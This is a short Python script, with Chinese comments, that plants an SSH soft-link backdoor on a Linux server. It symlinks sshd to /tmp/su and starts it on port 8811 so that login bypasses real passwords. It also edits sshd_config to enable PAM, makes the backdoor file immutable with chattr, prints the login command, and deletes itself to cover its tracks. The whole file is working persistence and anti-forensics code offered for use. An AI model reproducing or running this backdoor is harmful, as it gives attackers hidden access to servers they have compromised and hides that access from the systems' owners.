# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
import subprocess
import socket
import sys, os
import time

def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def ssh(port):
    command = 'ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=' + str(port)
    ml(command)
    host = '127.0.0.1'
    # 创建套接字对象
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    time.sleep(2)#延迟等待执行命令
    try:
        # 尝试连接到远程主机
        sock.connect((host, port))
        print("------>本地连接测试成功连接成功<------")
        print('可以使用SSH软链接后门，使用ps -aux关闭连接，删除/tmp/su文件')
        user = ml('id').strip()
        print("当前用户权限为:", user)
        user = ml('whoami').strip()
        ml('chattr +i /tmp/su')
        print('------>连接命令为:ssh ' + str(user) + '@ip -p ' + str(port)+'<------')
    except Exception as e:
        print("连接失败")
    finally:
        # 关闭套接字连接
        sock.close()


def miyue(new_content):
    filename = "/etc/ssh/sshd_config"
    with open(filename, 'a') as file:
        file.write(new_content + '\n')


def delete_current_script():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("当前脚本文件已成功删除" + script_path)
    except Exception as e:
        print("无法删除当前脚本文件：", e)


if __name__ == '__main__':
    command = 'cat /etc/ssh/sshd_config|grep UsePAM'
    j = ml(command)
    if 'UsePAM yes' in j:
        print('UsePAM开启')
        port = 8811
        ssh(port)
    else:
        print('正在开启UsePAM')
        miyue('UsePAM yes')
        port = 8811
        ssh(port)
    delete_current_script()  # 删除当前执行脚本文件
